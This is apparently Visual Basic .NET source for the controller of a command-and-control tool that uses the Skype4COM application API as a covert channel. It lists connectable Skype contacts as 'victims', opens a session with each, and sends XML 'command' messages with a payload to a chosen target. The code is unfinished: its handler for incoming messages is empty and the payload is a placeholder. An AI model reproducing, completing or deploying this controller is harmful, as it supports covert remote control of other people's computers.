Imports System.Xml
Imports System.Xml.Schema


Public Class Controller
    Public WithEvents oSkype As New SKYPE4COMLib.Skype
    Public oApplication As New SKYPE4COMLib.Application
    Public SessionTable As New Hashtable

    Private Sub Controller_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load


        Dim oApplicationStream As New SKYPE4COMLib.ApplicationStream

        ''Start Skype
        If Not oSkype.Client.IsRunning Then
            Try
                oSkype.Client.Start(True, True)
            Catch ex As Exception
                Debug.WriteLine("Skype Start Failed:" + ex.Message)
            End Try

        End If

        '' Wait Skype startup and attach
        System.Threading.Thread.Sleep(1000)
        Try
            oSkype.Attach(5, True)
        Catch ex As Exception
            Debug.WriteLine("Attach failed:" + ex.Message)
        End Try

        ''Create application
        oApplication = oSkype.Application("SSD")
        oApplication.Create()

        '' Load VictimsListView
        victimsLoad()


        '' End of the copy and paste programming! LOL
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Dim sstr As String = ""
        Dim tSID As String

        tSID = System.Guid.NewGuid().ToString()


        If VictimsListView.SelectedItems.Item(0).Text <> "" Then

            sstr = XML_write("echo123", tSID, "command")
            If XML_verify(sstr) <> False Then
                Debug.WriteLine(sstr)
                oApplication.SendDatagram(sstr)
            End If
        End If
    End Sub


    Private Sub oSkype_ApplicationDatagram(ByVal pApp As SKYPE4COMLib.Application, ByVal pStream As SKYPE4COMLib.ApplicationStream, ByVal Text As String) Handles oSkype.ApplicationDatagram
        Dim tString As New System.Text.StringBuilder

        If XML_verify(Text) <> False Then


        End If

    End Sub

    Public Function XML_verify(ByVal text As String)

        Try

            Dim Xml_StringReader As New IO.StringReader(text)
            Dim vrsettings As New XmlReaderSettings

            vrsettings.Schemas.Add("http://www.fucs.org/ssd_message_schema.xsd", New XmlTextReader(Me.GetType.Assembly.GetManifestResourceStream("SSD_Control.ssd_message_schema.xsd")))
            vrsettings.ValidationType = ValidationType.Schema
            AddHandler vrsettings.ValidationEventHandler, AddressOf ValidationEventHandler

            Dim doc As New XmlDocument()
            doc.Load(XmlReader.Create(New XmlTextReader(Xml_StringReader), vrsettings))
            doc.Validate(AddressOf ValidationEventHandler)
            Return doc

        Catch ex As Exception
            MsgBox(ex.Message.ToString)
            Return False
        End Try

    End Function


    Public Function XML_write(ByVal payload As String, ByVal tSID As String, ByVal type As String)
        Dim xml_str As New System.Text.StringBuilder()
        Dim settings As New XmlWriterSettings()
        settings.Indent = True
        settings.IndentChars = "    "

        Using writer As XmlWriter = XmlWriter.Create(xml_str, settings)
            writer.WriteStartDocument(True)
            writer.WriteComment("Created at " & DateTime.Now.ToString())
            writer.WriteStartElement("message", "http://www.fucs.org/ssd_message_schema.xsd")
            Select Case type
                Case "query"
                    writer.WriteElementString("query", "true")
                Case "response"
                    writer.WriteElementString("response", "true")
                Case "command"
                    writer.WriteElementString("command", "true")
            End Select
            writer.WriteElementString("payload", payload)
            writer.WriteElementString("SID", tSID)
            writer.WriteEndElement()
            writer.WriteEndDocument()
            writer.Close()
        End Using
        Return xml_str.ToString
    End Function

    Public Sub ValidationEventHandler(ByVal sender As Object, ByVal args As ValidationEventArgs)
        Select Case args.Severity
            Case XmlSeverityType.Error
                MsgBox(args.Message)
            Case XmlSeverityType.Warning
                MsgBox(args.Message)
        End Select

    End Sub

    Public Function victimsLoad()
        Try
            Dim user As SKYPE4COMLib.User
            VictimsListView.Items.Clear()
            For Each user In oApplication.ConnectableUsers()
                Dim tItem As New Windows.Forms.ListViewItem(user.Handle, 0)
                tItem.SubItems.Add(user.FullName)
                '' Place to insert verify of client
                oApplication.Connect(user.Handle, False)
                ''XML_write("status", "tSID", "query")
                Dim tSID As String = (System.Guid.NewGuid().ToString())
                SessionTable.Add(user.Handle, tSID)
                VictimsListView.Items.Add(tItem)
            Next
            VictimsListView.Focus()
            VictimsListView.Items(0).Selected = True
            Return True

        Catch ex As Exception
            Return False
        End Try

    End Function

    Private Sub ExitToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ExitToolStripMenuItem.Click
        End
    End Sub

End Class
